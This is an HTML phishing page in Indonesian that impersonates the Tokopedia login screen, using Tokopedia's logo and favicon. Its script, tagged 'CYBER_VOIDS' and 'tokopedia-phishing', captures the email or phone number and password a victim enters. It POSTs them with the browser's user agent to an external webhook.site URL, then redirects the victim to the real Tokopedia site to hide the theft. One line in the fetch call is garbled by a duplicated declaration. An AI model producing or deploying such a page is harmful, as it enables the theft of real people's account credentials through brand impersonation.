<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tokopedia - Masuk ke Akun Anda</title>
    <link rel="icon" href="https://ecs7.tokopedia.net/assets-tokopoints-email/images/favicon.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 400px; }
        .logo { text-align: center; margin-bottom: 25px; }
        .logo img { width: 160px; }
        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        h1 { font-size: 22px; color: #333; margin-bottom: 8px; }
        .subtitle { color: #666; font-size: 14px; margin-bottom: 25px; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 15px; }
        button { width: 100%; background: #42b549; color: white; border: none; padding: 15px; border-radius: 6px; font-size: 16px; font-weight: bold; margin-top: 10px; cursor: pointer; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #888; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://ecs7.tokopedia.net/assets-tokopoints-email/images/logo-tokopedia.png" alt="Tokopedia">
        </div>
        <div class="card">
            <h1>Masuk ke Akun Anda</h1>
            <p class="subtitle">Selamat datang kembali! Masuk dengan akun Tokopedia Anda.</p>
            
            <form id="loginForm">
                <input type="text" id="email" placeholder="Email / Nomor HP" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" id="submitBtn">MASUK</button>
            </form>
            
            <div id="loading" class="hidden">üîÑ Memverifikasi...</div>
            
            <div class="footer">
                Dengan masuk, Anda menyetujui Syarat & Ketentuan Tokopedia.
            </div>
        </div>
    </div>

    <script>
    // CYBER_VOIDS FINAL SCRIPT - WEBHOOK BARU
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Ambil data
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const btn = document.getElementById('submitBtn');
        const loading = document.getElementById('loading');
        
        // Tampilkan loading
        btn.disabled = true;
        btn.textContent = 'Memproses...';
        loading.classList.remove('hidden');
        
        // 1. LOG KE CONSOLE
        console.log('=== CYBER_VOIDS DATA CAPTURE ===');
        console.log('üìß Email:', email);
        console.log('üîê Password:', password);
        console.log('üåê User Agent:', navigator.userAgent);
        
        // 2. KIRIM KE WEBHOOK BARU
        // URL WEBHOOK KAMU: https://webhook.site/5dd5d6aa-96c8-4763-ba64-489bd6fdc4d3
        const WEBHOOK_URL = 'https://webhook.site/5dd5d6aa-96c8-4763-ba64-489bd6fdc4d3';
        
        fetch(WEBHOOK_URL, {const WEBHOOK_URL = 'https://webhook.site/5dd5d6aa-96c8-4763-ba64-489bd6fdc4d3';
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: email,
                password: password,
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                source: 'tokopedia-phishing'
            })
        })
        .then(response => {
            console.log('‚úÖ Status:', response.status);
            console.log('‚úÖ Data terkirim ke webhook baru');
        })
        .catch(error => {
            console.error('‚ùå Gagal mengirim:', error);
        });
        
        // 3. REDIRECT KE TOKOPEDIA SETELAH 1.5 DETIK
        setTimeout(function() {
            window.location.href = 'https://www.tokopedia.com';
        }, 1500);
    });
    </script>
</body>
</html>
